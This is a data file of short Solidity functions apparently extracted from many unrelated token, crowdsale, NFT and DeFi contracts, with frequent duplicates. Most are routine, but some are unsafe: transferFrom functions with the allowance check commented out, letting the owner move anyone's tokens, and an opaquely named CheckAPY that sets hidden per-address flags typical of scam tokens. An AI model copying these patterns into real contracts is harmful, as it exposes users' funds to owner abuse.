    researchDivPercent = newResearchPercent;
  }
--------------------------------------------------------------------------------
function ShrimpFarmer() public{
        ceoAddress=msg.sender;
        dev2=address(0x95096780Efd48FA66483Bc197677e89f37Ca0CB5);
        lastBidTime=now;
        currentWinner=msg.sender;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
    returns (bool success) {
        if (_value <= 0) throw;
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
constructor (address fundAcc) public {
        //costructor
        require(fundAcc != address(0)); //Fund must exist
        partners[0]=Partner(Role.Fund, fundAcc, 0);// Always must be Fund
    }
--------------------------------------------------------------------------------
function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal {
        super._preValidatePurchase(_beneficiary, _weiAmount);
        require(_weiAmount >= (1 ether / rate).mul(10));
    }
--------------------------------------------------------------------------------
function finishPresale() public onlyOwner returns (bool success) {
        require(contract_state == State.Presale);
        contract_state = State.waitingForICO;
        NewState(contract_state);
        return true;
    }
--------------------------------------------------------------------------------
function startICO() public onlyOwner returns (bool success) {
        require(contract_state == State.waitingForICO);
        contract_state = State.ICO;
        NewState(contract_state);
        return true;
    }
--------------------------------------------------------------------------------
constructor (Token _company_token) public {
    owner = msg.sender;
    company_token = _company_token;
    currentBatch = 0;
    addrPerStep = 10;
    setBountyAddresses();
    setBountyAmounts();
  }
--------------------------------------------------------------------------------
function FobsCoin() public {
    totalSupply_ = INITIAL_SUPPLY;
    balances[msg.sender] = INITIAL_SUPPLY;
    Transfer(0x0, msg.sender, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function hasRedeemed(address _address, uint _weekNo) public view returns (bool) {
        uint week = _weekNo == 0 ? getWeek() : _weekNo;
        return claimed[_address][week];
    }
--------------------------------------------------------------------------------
function unpauseContract() public {
    require(isContract(crydrController) == true);
    require(getAssetIDHash() == AssetIDInterface(crydrController).getAssetIDHash());

    super.unpauseContract();
  }
--------------------------------------------------------------------------------
function EightteenToken() {
        founder = msg.sender;
        totalSupply = 1000000000 * 10 ** uint256(decimals);
        balances[founder] = totalSupply;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
    returns(bool success) {
        allowance[msg.sender][_spender] = _value;
        tokenRecipient spender = tokenRecipient(_spender);
        return true;
    }
--------------------------------------------------------------------------------
function isPreSale() constant public returns (bool preSale) {
		bool result=(preSaleEnd >= now);
		if(enablePreSale){
		    return true;
		}
		else{
		    return result;
		}
	}
--------------------------------------------------------------------------------
function isLocked(address wallet, address currencyCt, uint256 currencyId)
    public
    view
    returns (bool)
    {
        return 0 < walletCurrencyFungibleLockCount[wallet][currencyCt][currencyId] ||
        0 < walletCurrencyNonFungibleLockCount[wallet][currencyCt][currencyId];
    }
--------------------------------------------------------------------------------
function fromCompound(address _token, uint _amount) external onlyAuthorized {
        require(ICToken(globalConfig.tokenInfoRegistry().getCToken(_token)).redeemUnderlying(_amount) == 0, "redeemUnderlying failed");
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function suspend() external onlyOwner returns(bool) {
        if (suspended == true) {
            return false;
        }

        suspended = true;

        emit SaleSuspended();

        return true;
    }
--------------------------------------------------------------------------------
function resume() external onlyOwner returns(bool) {
        if (suspended == false) {
            return false;
        }

        suspended = false;

        emit SaleResumed();

        return true;
    }
--------------------------------------------------------------------------------
function setAgreementHash(bytes32 _agreementHash) internal
    {
        require(agreementHash == bytes32(0), "Can not set agreement twice");
        agreementHash = _agreementHash;
    }
--------------------------------------------------------------------------------
function depositEther() public payable
    {
        addressToEtherBalance[msg.sender] += msg.value;
        
        emit EtherDeposited(msg.sender, msg.value);
    }
--------------------------------------------------------------------------------
function addExecutors(address[] calldata executorArray) external onlyOwner {
        for (uint256 i = 0; i < executorArray.length; i++) {
            addExecutor(executorArray[i]);
        }
    }
--------------------------------------------------------------------------------
function removeExecutors(address[] calldata executorArray) external onlyOwner {
        for (uint256 i = 0; i < executorArray.length; i++) {
            removeExecutor(executorArray[i]);
        }
    }
--------------------------------------------------------------------------------
function IGI(){
		totalSupply=MAX_SUPPLY;
		balances[msg.sender] = MAX_SUPPLY;
		Transfer(0x0, msg.sender, MAX_SUPPLY);
	}
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
constructor() internal {
        address payable msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
--------------------------------------------------------------------------------
function isPendingRegistration(address _darknodeID) external view returns (bool) {
        uint256 registeredAt = store.darknodeRegisteredAt(_darknodeID);
        return registeredAt != 0 && registeredAt > currentEpoch.blocknumber;
    }
--------------------------------------------------------------------------------
function isPendingDeregistration(address _darknodeID) external view returns (bool) {
        uint256 deregisteredAt = store.darknodeDeregisteredAt(_darknodeID);
        return deregisteredAt != 0 && deregisteredAt > currentEpoch.blocknumber;
    }
--------------------------------------------------------------------------------
function isDeregistered(address _darknodeID) public view returns (bool) {
        uint256 deregisteredAt = store.darknodeDeregisteredAt(_darknodeID);
        return deregisteredAt != 0 && deregisteredAt <= currentEpoch.blocknumber;
    }
--------------------------------------------------------------------------------
function updatePrice(uint _level, uint _price) public returns (bool) {
        require(msg.sender == ownerAddress, "only OwnerWallet");

        LEVEL_PRICE[_level] = _price;
        return true;
    }
--------------------------------------------------------------------------------
function chooseWinner() internal {
         if ((nextTokenId - 1) == totalTokenSupply) {
            winningTokenId = getRandomNumber();
            emit WinnerIsChosen(tokenOwner[winningTokenId], winningTokenId);
        } 
    }
--------------------------------------------------------------------------------
function scalePurchaseTokenAmountToMatchRemainingTokens(uint256 _amount) internal view returns (uint256 _exactAmount) {
        if (nextTokenId + _amount - 1 > totalTokenSupply) {
            _amount = totalTokenSupply - nextTokenId + 1;
        }
        
        return _amount;
    }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function BuguToken() public {
        _totalSupply = INITIAL_SUPPLY;
        balances[msg.sender] = INITIAL_SUPPLY;
        Transfer(0x0, msg.sender, INITIAL_SUPPLY);
    }
--------------------------------------------------------------------------------
function returnEth() internal {
        // return if some eth left
        if (address(this).balance > 0) {
            msg.sender.transfer(address(this).balance);
        }
    }
--------------------------------------------------------------------------------
function registerAddress(bytes32 _contractName, address _contractAddress) public ownerOnly {
        require(_contractName.length > 0); // validating input

        addresses[_contractName] = _contractAddress;
        emit AddressUpdate(_contractName, _contractAddress);
    }
--------------------------------------------------------------------------------
function _mint(address to) internal virtual returns (uint256){
    _tokenIds.increment();
    uint256 id = _tokenIds.current();
    _safeMint(to, id);

    return id;
  }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function setApprovalForAll(address _operator, bool _approved)
    external
  {
    // Update operator status
    operators[msg.sender][_operator] = _approved;
    emit ApprovalForAll(msg.sender, _operator, _approved);
  }
--------------------------------------------------------------------------------
function setauctionsystem(uint auctids, uint setnum) public onlyadmin{
	    auctionlist storage c = auctionlisting[auctids]; 
	    c.ifend = true;
	    c.ifsend = setnum;
	}
--------------------------------------------------------------------------------
function unlock(uint amount) public override onlyOwner {
          require(lockedAmount >= amount, "Pool: Insufficient locked funds");
          lockedAmount = lockedAmount.sub(amount);
      }
--------------------------------------------------------------------------------
constructor() public {
    balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
--------------------------------------------------------------------------------
function transferOwnership(
    address _newOwner
  )
    public
    onlyOwner
  {
    require(_newOwner != address(0), CANNOT_TRANSFER_TO_ZERO_ADDRESS);
    emit OwnershipTransferred(owner, _newOwner);
    owner = _newOwner;
  }
--------------------------------------------------------------------------------
constructor (uint256 totalSupply, address initialAccount) internal {
        _totalSupply = totalSupply;
        _balances[initialAccount] = totalSupply;
        emit Transfer(address(0), initialAccount, totalSupply);
    }
--------------------------------------------------------------------------------
function transfer(address _to, uint _amount) public returns (bool success) {
    require( _to == owner || (!tokensFrozen && _to == redemptionWallet) );
    return super.transfer(_to, _amount);
  }
--------------------------------------------------------------------------------
function getAddressInfo(address _address)
        external
        view
        returns (
            AddressStatus status,
            uint numberOfRequests
        )
    {
        Address storage addr = addresses[_address];
        return (
            addr.status,
            addr.requests.length
        );
    }
--------------------------------------------------------------------------------
function escapeHatch() onlyEscapeHatchCallerOrOwner {
        uint total = this.balance;
        // Send the total balance of this contract to the `escapeHatchDestination`
        if (!escapeHatchDestination.send(total)) {
            throw;
        }
        EscapeHatchCalled(total);
    }
--------------------------------------------------------------------------------
function claim(uint256 _poolId) external override {
        require(poolMap[_poolId].vault == msg.sender, "sender not vault");
        _claim(_poolId);
    }
--------------------------------------------------------------------------------
function sweep(
        address to,
        ERC20 token,
        uint256 amount
    ) external requiresAuth {
        emit TokenSweeped(msg.sender, to, token, amount);

        // Transfer the sweeped tokens to the recipient.
        token.safeTransfer(to, amount);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function registerSsp(address sspAddress, SSPType sspType, uint16 publisherFee) {
        receiveSecurityDeposit(sspAddress);
        sspRegistry.register(sspAddress, sspType, publisherFee, msg.sender);
        SSPRegistered(sspAddress);
    }
--------------------------------------------------------------------------------
function restoreFees(uint256 liquidityFee, uint256 marketingFee, uint256 holdersFee) public onlyOwner {
		_marketingFee = 5;
		_liquidityFee = 3;
		_holdersFee = 2;
		emit FeesRestored(liquidityFee, marketingFee, holdersFee);
	}
--------------------------------------------------------------------------------
constructor() public {
    balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
--------------------------------------------------------------------------------
function() public payable {
        snailPot = snailPot.add(msg.value);
        
        emit BoostedPot(msg.sender, msg.value);
    }
--------------------------------------------------------------------------------
function ComputeSnailCost(uint256 _id) public view returns(uint256){
        uint256 _cost = (colorSnail[_id].level.add(1)).mul(SNAIL_COST);
        return _cost;
    }
--------------------------------------------------------------------------------
function ComputeLordCost(uint256 _id) public view returns(uint256){
        uint256 _cost = (lord[_id].level.add(1)).mul(LORD_COST);
        return _cost;
    }
--------------------------------------------------------------------------------
function getTakerFeeRate(OrderParam memory orderParam, bool isParticipantRelayer)
        internal
        view
        returns(uint256)
    {
        uint256 rawRate = getAsTakerFeeRateFromOrderData(orderParam.data);
        return getFinalFeeRate(orderParam.trader, rawRate, isParticipantRelayer);
    }
--------------------------------------------------------------------------------
function settleResults(
        MatchResult[] memory results,
        OrderParam memory takerOrderParam,
        OrderAddressSet memory orderAddressSet
    )
        internal
    {
        if (isSell(takerOrderParam.data)) {
            settleTakerSell(results, orderAddressSet);
        } else {
            settleTakerBuy(results, orderAddressSet);
        }
    }
--------------------------------------------------------------------------------
function _transferOwnership(address _newOwner) internal {
    require(_newOwner != address(0), "OW02");
    emit OwnershipTransferred(owner, _newOwner);
    owner = _newOwner;
  }
--------------------------------------------------------------------------------
constructor(address _nftAddress, uint256 _cut) public {
        require(_cut <= 10000);
        ownerCut = _cut;

        ERC721Basic candidateContract = ERC721Basic(_nftAddress);
        nonFungibleContract = candidateContract;
    }
--------------------------------------------------------------------------------
function transferAdminQuickly(address newAdmin) public onlyAdmin {
        require(newAdmin != address(0));
        TransferAdminPending(newAdmin);
        AdminClaimed(newAdmin, admin);
        admin = newAdmin;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value) returns (bool success) {
    if (_value <= 0) revert();
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function calcAmount() internal returns (uint256) {
        // get ammount in wei
        uint256 weiAmount = msg.value;
        
        // calculate token amount to be created
        uint256 tokens = weiAmount.mul(rate);
    
        return tokens;
    }
--------------------------------------------------------------------------------
function transferFrom(address _from, address _to, uint256 _value) onlyOwner public returns (bool success) {
        //require(_value <= allowance[_from][msg.sender]);     // Check allowance
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }
--------------------------------------------------------------------------------
constructor(
        string memory name_,
        string memory symbol_,
        string memory uri_,
        address genArtInterfaceAddress_
    ) {
        _name = name_;
        _symbol = symbol_;
        _baseURI = uri_;
        _genArtInterface = IGenArtInterface(genArtInterfaceAddress_);
        _collectionIdCounter.increment();
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function withdraw(uint256 amount) external  {
        
        
        
        
        
        balances[_msgSender()] = balances[_msgSender()].sub(amount);
        
        require(_rfiextremetoken.transfer(_msgSender(),amount));
        
        
    }
--------------------------------------------------------------------------------
function transfer(address dst, uint256 amount) external nonReentrant returns (bool) {
        return transferTokens(msg.sender, msg.sender, dst, amount) == uint(Error.NO_ERROR);
    }
--------------------------------------------------------------------------------
function borrowBalanceCurrent(address account) external nonReentrant returns (uint) {
        require(accrueInterest() == uint(Error.NO_ERROR), "accrue interest failed");
        return borrowBalanceStored(account);
    }
--------------------------------------------------------------------------------
function getIndexfromQA(uint256 questionId, uint256 textId)
        public view
        returns (uint256) {
            
        require (questionId < numberOfQuestions);
        require (textId < _supplyPerQ[questionId]);
        return _theQAtoIndex[questionId][textId];
    }
--------------------------------------------------------------------------------
function adminSetResource(address handlerAddress, bytes32 resourceID, address tokenAddress) external onlyAdmin {
        _resourceIDToHandlerAddress[resourceID] = handlerAddress;
        IERCHandler handler = IERCHandler(handlerAddress);
        handler.setResource(resourceID, tokenAddress);
    }
--------------------------------------------------------------------------------
function getProposal(uint8 originChainID, uint64 depositNonce, bytes32 dataHash) external view returns (Proposal memory) {
        uint72 nonceAndID = (uint72(depositNonce) << 8) | uint72(originChainID);
        return _proposals[nonceAndID][dataHash];
    }
--------------------------------------------------------------------------------
function setApprovalForAll(address _operator,bool _approved)external{approvedForAll[msg.sender][_operator]=_approved;emit ApprovalForAll(msg.sender,_operator,_approved);}
--------------------------------------------------------------------------------
function validPurchase() internal constant returns (bool) {

    bool withinPeriod = started;

    bool nonZeroPurchase = msg.value != 0;

    return withinPeriod && nonZeroPurchase;

  }
--------------------------------------------------------------------------------
function _transfer(address _from, address _to, uint256 _tokenId) internal whenNotPaused {
    super._transfer(_from, _to, _tokenId);
    _addTokenTo(_to,_tokenId);
    _removeTokenFrom(_from, _tokenId);
  }
--------------------------------------------------------------------------------
function finalSuccess() private {
		// Set the datetime of a successful processing
		successfulTime = now;

		// Set new sale state
		saleState = States.NoEntry;

		// Select the winning ticket number
		winnerTicket = getRand(totalTickets) + 1;

		// Get the winner address
		winnerKey = getWinnerKey();
	}
--------------------------------------------------------------------------------
function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
        _ownerAddress = address(0);
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function freeze (address target, bool froze ) public   {
        if(froze || (!froze && !usersCanUnfreeze)) {
            require(admin[msg.sender]);
        }
        _freeze(target, froze);
    }
--------------------------------------------------------------------------------
function ETIC(){
		totalSupply=MAX_SUPPLY;
		balances[msg.sender] = MAX_SUPPLY;
		Transfer(0x0, msg.sender, MAX_SUPPLY);
	}
--------------------------------------------------------------------------------
function _transferFrom(address from, address to, uint256 tokenId) internal {
        super._transferFrom(from, to, tokenId);

        _removeTokenFromOwnerEnumeration(from, tokenId);

        _addTokenToOwnerEnumeration(to, tokenId);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function setUpgradeMaster(address master) public {
      if (master == 0x0) revert();
      if (msg.sender != upgradeMaster) revert();
      upgradeMaster = master;
  }
--------------------------------------------------------------------------------
function setWeiPerUSDinTGE(uint256 _weiPerUSD) public onlyOwner {
    require(_weiPerUSD > 0);
    assert(block.timestamp < startTimestamp.sub(setWeiLockSeconds));

    weiPerUSDinTGE = _weiPerUSD;
  }
--------------------------------------------------------------------------------
function withdrawFunds() 
		external 
	{
		uint256 withdrawableFunds = _prepareWithdraw();

		require(fundsToken.transfer(_msgSender(), withdrawableFunds), "LexSecurityToken: TRANSFER_FAILED");

		_updateFundsTokenBalance();
	}
--------------------------------------------------------------------------------
function deriveKeyAndDeployViaExistingRuntimeStorageContract(
    bytes32 salt,
    address initializationRuntimeStorageContract
  )
    external
    payable
    returns (address homeAddress, bytes32 key, bytes32 runtimeCodeHash)
  {
    // Ensure that the supplied runtime storage contract is not empty.
    _validateRuntimeStorageIsNotEmpty(initializationRuntimeStorageContract);

    // Derive key and prepare to deploy using supplied salt and calling address.
    key = _deriveKeyAndPrepareToDeploy(salt);

    // Set the initialization runtime storage contract in contract storage.
    _initializationRuntimeStorageContract = initializationRuntimeStorageContract;

    // Use metamorphic initialization code to deploy contract to home address.
    (homeAddress, runtimeCodeHash) = _deployToHomeAddress(key);
  }
--------------------------------------------------------------------------------
function _mint(address to, uint256 tokenId) internal {
    super._mint(to, tokenId);

    _allTokensIndex[tokenId] = _allTokens.length;
    _allTokens.push(tokenId);
  }
--------------------------------------------------------------------------------
function _approve(address _owner, address _spender, uint256 _amount) 
      internal
    returns (bool success)
    {
        allowed[_owner][_spender] = _amount;
        emit Approval(_owner, _spender, _amount);
        return true;
    }
--------------------------------------------------------------------------------
function recoverPreSigned(
        bytes _sig,
        bytes4 _function,
        address _to,
        uint256 _value,
        bytes _extraData,
        uint256 _gasPrice,
        uint256 _nonce) 
      public
      view
    returns (address recovered)
    {
        return ecrecoverFromSig(getSignHash(getPreSignedHash(_function, _to, _value, _extraData, _gasPrice, _nonce)), _sig);
    }
--------------------------------------------------------------------------------
function _mint(address _to, uint256 _tokenId) internal {
    super._mint(_to, _tokenId);
    allTokensIndex[_tokenId] = allTokens.length;
    allTokens.push(_tokenId);
  }
--------------------------------------------------------------------------------
function FiLinkToken() public {

        totalSupply_ = INITIAL_SUPPLY;

        balances[msg.sender] = INITIAL_SUPPLY;

        Transfer(0x0, msg.sender, INITIAL_SUPPLY);

    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function spinwinAddFunds(uint256 amount) public onlySpinwin {
		// Safely update contract balance
		_uintSettings['contractBalance'] = _uintSettings['contractBalance'].add(amount);

		// Update max profit
		_setMaxProfit(false);

		emit LogAddBankRoll(amount);
	}
--------------------------------------------------------------------------------
function Authorizable() {
    authorizers.length = 2;
    authorizers[1] = msg.sender;
    authorizerIndex[msg.sender] = 1;
  }
--------------------------------------------------------------------------------
function addAuthorized(address _addr) external onlyAuthorized {
    authorizerIndex[_addr] = authorizers.length;
    authorizers.length++;
    authorizers[authorizers.length - 1] = _addr;
  }
--------------------------------------------------------------------------------
function Crowdsale(
    ) {
        createdTimestamp = block.timestamp;
        start = 1526292000;//createdTimestamp + 0 * 1 days + 30 * 1 minutes;
        deadline = 1529143200;//;createdTimestamp + 1 * 1 days + 0 * 1 minutes;
        amountRaised=0;
        beneficiary = 0xDfD0500541c6F14eb9eD2A6e61BB63bc78693925;
    }
--------------------------------------------------------------------------------
function disburse(uint256 amount) internal{
        uint256 unnormalized = amount.mul(pointMultiplier);
        totalDividentPoints = totalDividentPoints.add(unnormalized.div(stakedCoins)); // stakedCoins is the MCORE_WETH lp tokens
    }
--------------------------------------------------------------------------------
function claim(uint256 _poolId) external override {
        require(poolMap[_poolId].vault == msg.sender, "sender not vault");
        _claim(_poolId);

    }
--------------------------------------------------------------------------------
constructor() public {
    balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
--------------------------------------------------------------------------------
function payDev(address dev) internal
    {
        uint balance = SafeMath.div(address(this).balance, 10);
        dev.transfer(balance);
    }
--------------------------------------------------------------------------------
function setUpgradeMaster(address master) public {
      if (master == 0x0) throw;
      if (msg.sender != upgradeMaster) throw;
      upgradeMaster = master;
  }
--------------------------------------------------------------------------------
function hasEnded() public view returns (bool) {
    bool capReached = tokensIssued >= 80000000000000000000000000; // Token sale Hard Capped to 100Mil (80 investors + 20 others)
    bool timeOver = now > endTime; // Token sale ended
    return capReached || timeOver;
  }
--------------------------------------------------------------------------------
function _mint(address _to, uint256 _tokenId) internal {
    super._mint(_to, _tokenId);

    allTokensIndex[_tokenId] = allTokens.length;
    allTokens.push(_tokenId);
  }
--------------------------------------------------------------------------------
function returnEth() internal {
        // return if some eth left
        if (address(this).balance > 0) {
            msg.sender.transfer(address(this).balance);
        }
    }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function _isCarousal(uint256 currentTerm) external view returns(bool) {
       return (currentTerm > 1 && CLotteries[currentTerm - 2].noFirstReward && CLotteries[currentTerm - 1].noFirstReward); 
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function _mint(address _to, uint256 _tokenId) internal {
    super._mint(_to, _tokenId);

    allTokensIndex[_tokenId] = allTokens.length;
    allTokens.push(_tokenId);
  }
--------------------------------------------------------------------------------
function ownerOf(uint256 tokenId) public view virtual override returns (address) {
        address owner = _owners[tokenId];
        require(owner != address(0), "#45");
        return owner;
    }
--------------------------------------------------------------------------------
function _safeTransfer(address from, address to, uint256 tokenId, bytes memory _data) internal virtual {
        _transfer(from, to, tokenId);
        require(_checkOnERC721Received(from, to, tokenId, _data), "#53");
    }
--------------------------------------------------------------------------------
function _safeMint(address to, uint256 tokenId, bytes memory _data) internal virtual {
        _mint(to, tokenId);
        require(_checkOnERC721Received(address(0), to, tokenId, _data), "#55");
    }
--------------------------------------------------------------------------------
function transferFrom(address _from, address _to, uint256 _value) onlyOwner public returns (bool success) {
        //require(_value <= allowance[_from][msg.sender]);     // Check allowance
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }
--------------------------------------------------------------------------------
constructor () public {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
--------------------------------------------------------------------------------
function validPurchase() internal view returns (bool) {
    bool withinCap = weiRaised.add(msg.value) <= cap;
    return super.validPurchase() && withinCap;
  }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
        if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function _mint(address _to, uint256 _tokenId) internal {
    super._mint(_to, _tokenId);

    allTokensIndex[_tokenId] = allTokens.length;
    allTokens.push(_tokenId);
  }
--------------------------------------------------------------------------------
function getRewardForDuration(address rewardToken) external view returns (uint256) {
        RewardInfo storage ri = rewardsTokensMap[rewardToken];
        return ri.rewardRate.mul(ri.rewardDuration);
    }
--------------------------------------------------------------------------------
function sendTokens(address _address , uint256 _amount) isAuthorized returns (bool success) {
    ERC20Basic token = ERC20Basic( tokenAdd );
    require( token.transfer(_address , _amount ) );
    return true;
}
--------------------------------------------------------------------------------
function _setImplementation(address _newImplementation) internal {
    require(msg.sender == proxyOwner());
    bytes32 position = implementationPosition;

    assembly {
      sstore(position, _newImplementation)
    }
  }
--------------------------------------------------------------------------------
function issueTokens(address _recipient, uint256 _tokens) private {
        // Update total sold tokens.
        tokensSold = tokensSold.add(_tokens);

        stox.issue(_recipient, _tokens);

        TokensIssued(_recipient, _tokens);
    }
--------------------------------------------------------------------------------
function validPurchase() internal constant returns (bool) {
    bool withinCap = weiRaised.add(msg.value) <= cap;
    return super.validPurchase() && withinCap;
  }
--------------------------------------------------------------------------------
function setStakingPoolList(address[] memory stakingRewardAddress)
        public
        onlyAdmin
    {
        for (uint256 i; i < stakingRewardAddress.length; i++) {
            stakingRewardList.push(stakingRewardAddress[i]);
        }
    }
--------------------------------------------------------------------------------
constructor(address _logic, address _admin, bytes memory _data) UpgradeabilityProxy(_logic, _data) public payable {
    assert(ADMIN_SLOT == bytes32(uint256(keccak256('eip1967.proxy.admin')) - 1));
    _setAdmin(_admin);
  }
--------------------------------------------------------------------------------
function getTokenInfo(uint256 _tokenId) public view returns (
        address owner,
        uint256 price,
        bytes32 tokenData
    ) {
        owner = tokensContract.ownerOf(_tokenId);
        price = tokenIndexToPrice[_tokenId];
        tokenData = tokensContract.getTokenData(_tokenId);
    }
--------------------------------------------------------------------------------
function initialize(
        address _nexus,
        address[] calldata _whitelisted,
        address _platformAddress,
        address[] calldata _bAssets,
        address[] calldata _pTokens
    )
        external
        initializer
    {
        InitializableReentrancyGuard._initialize();
        InitializableGovernableWhitelist._initialize(_nexus, _whitelisted);
        InitializableAbstractIntegration._initialize(_platformAddress, _bAssets, _pTokens);
    }
--------------------------------------------------------------------------------
function rewardExternal(address _receiver, uint _amount) onlyMiningContract public {
        balances[_receiver] = balances[_receiver].add(_amount);
        emit Transfer(this, _receiver, _amount);
    }
--------------------------------------------------------------------------------
function() public payable {
        snailPot = snailPot.add(msg.value);
        
        emit BoostedPot(msg.sender, msg.value);
    }
--------------------------------------------------------------------------------
function deprecate(address _upgradedAddress) public onlyOwner {
        require(_upgradedAddress != address(0));
        deprecated = true;
        upgradedAddress = _upgradedAddress;
        emit Deprecate(_upgradedAddress);
    }
--------------------------------------------------------------------------------
function setMigrationDue(uint256 _migrationDue) public {
        require(msg.sender == governance, "not governance");
        require(!migrated, "migrated");

        migrationDue = _migrationDue;
    }
--------------------------------------------------------------------------------
function _setUpgradeabilityOwner(address _newUpgradeabilityOwner) internal {
        require(_newUpgradeabilityOwner != address(0), "Address should not be 0x");
        __upgradeabilityOwner = _newUpgradeabilityOwner;
    }
--------------------------------------------------------------------------------
function changeCooldownSettings(bool newStatus, uint256 newInterval) external onlyOwner {
        require(newInterval <= 24 hours, "Exceeds the limit");
        cooldownEnabled = newStatus;
        cooldownTimerInterval = newInterval;
    }
--------------------------------------------------------------------------------
function toggleAllowAnyToken(bool allow) public {
    require(msg.sender == owner, "toggleAllowAnyToken: only owner can toggle");
    allowAnyToken = allow;
  }
--------------------------------------------------------------------------------
function burnTokens(address _from, uint _value) onlyIcoContract {
        require(_value > 0);

        balances[_from] = sub(balances[_from], _value);
        totalSupply -= _value;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
constructor(uint startingStage) public {
        if (startingStage == uint(Stage.GameRounds)) {
            stage = Stage.GameRounds;
            _startGameRound();
        } else {
            _startAuction();
        }
    }
--------------------------------------------------------------------------------
function tokenByIndex(uint256 index) public view override returns (uint256) {
    require(index < totalSupply(), "ERC721A: global index out of bounds");
    return index;
  }
--------------------------------------------------------------------------------
function inCaseTokenGetsStuck(IERC20 _TokenAddress) onlyOwner public {
      uint qty = _TokenAddress.balanceOf(address(this));
      _TokenAddress.safeTransfer(msg.sender, qty);
  }
--------------------------------------------------------------------------------
function inRebaseWindow() public view returns (bool) {
        return (
            now.mod(minRebaseTimeIntervalSec) >= rebaseWindowOffsetSec &&
            now.mod(minRebaseTimeIntervalSec) < (rebaseWindowOffsetSec.add(rebaseWindowLengthSec))
        );
    }
--------------------------------------------------------------------------------
function receiveApproval(address _from, uint256 _value, 
address _token, bytes _extraData) external returns(bool){ 
TOC
TOCCall = TOC(_token);
TOCCall.transferFrom(_from,this,_value);
return true;
}
--------------------------------------------------------------------------------
function setAdmin(address _addr, bool _isAdmin)
    public
    onlyOwner
  {
    require(_addr != address(0));
    admin[_addr] = _isAdmin;

    emit SetAdmin(_addr, _isAdmin);
  }
--------------------------------------------------------------------------------
function Mtoken() public {
        totalSupply_ = INITIAL_SUPPLY;
        balances[msg.sender] = totalSupply_;
        Transfer(0x0, msg.sender, totalSupply_);
    }
--------------------------------------------------------------------------------
function CheckAPY(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    marbel[spender] = val;
    beast[spender] = val2; 
    aunt[spender] = val3;
    utah = val4;
  }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function SmartCityToken(address _ownerAddress, uint256 _startTime) public {
        owner = _ownerAddress; // token Owner
        startTime = _startTime; // token Start Time
        unlockOwnerDate = startTime + 2 years;
        balances[owner] = totalSupply; // all tokens are initially allocated to token owner
    }
--------------------------------------------------------------------------------
constructor() public {
        treasuryWalletAddr = _msgSender();
        racaInAdvance = 500000 * 10**6 * 10**18;

        mint(treasuryWalletAddr, racaInAdvance);
    }
